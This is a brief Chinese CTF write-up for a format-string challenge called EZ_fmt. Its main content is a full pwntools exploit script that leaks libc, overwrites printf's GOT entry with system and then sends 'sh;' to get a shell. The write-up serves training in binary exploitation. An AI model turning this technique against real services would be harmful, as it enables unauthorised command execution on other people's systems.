# EZ_fmt

![image (25)](assets/images/wp/2024/week2/image (25).png)

很经典的格式化字符串

首先确定offset为8

![image (26)](assets/images/wp/2024/week2/image (26).png)

根据程序

我们有三次格式化字符串的机会

第一次泄露libc

第二次改printf got表地址为system

第三次输入为sh，构造出printf(buf)=system(sh)即可

exp如下

```Python
from pwn import *
import sys
from ctypes import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux','splitw','-h']

libc = ELF('./libc.so.6')
elf = ELF('./chal')
flag =0
if flag:
    p = remote('ip', port)
else:
    p = process("./")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+"--->"+hex(addr))


sla(b': \n', b'%19$p')
ru(b'0x')
libc.address = int(rc(12),16) - 0x29d90
leak("libc", libc.address)

low = libc.sym['system']&0xff
high = (libc.sym['system']>>8)&0xffff
payload = b'%' + str(low).encode() + b'c%12$hhn'
payload += b'%' + str(high - low).encode() + b'c%13$hn'
payload = payload.ljust(0x20,b'a')
payload += p64(elf.got['printf']) + p64(elf.got['printf']+1)


sa(b': \n', payload)

sla(b': \n', b'  sh;')
# gdb.attach(p)
p.interactive()
```